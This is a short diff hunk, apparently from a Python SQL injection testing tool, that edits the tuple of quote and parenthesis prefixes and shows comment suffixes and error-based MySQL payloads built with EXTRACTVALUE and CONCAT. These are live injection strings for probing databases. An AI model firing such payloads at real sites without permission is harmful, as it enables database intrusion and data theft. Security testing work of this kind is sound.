@@ -18,7 +18,7 @@ Str1 = "0x"+Ste
 
 
 ## MySQL Injection Type AND MySQL Comments
-PREFIXES, SUFIXES = (" ","'", "' ", "'+", ") ", "') "),("", "AND'", "--+-", "%23", "AND '1")
+PREFIXES, SUFIXES = (" ", "' ", '" ', ") ", "') "),("", "AND'", "--+-", "%23", "AND '1")
 
 # Test Queries for extractvalue()
 TESTS = ("AND+EXTRACTVALUE(0,CONCAT(0x7e,"+str(Str1)+"))",
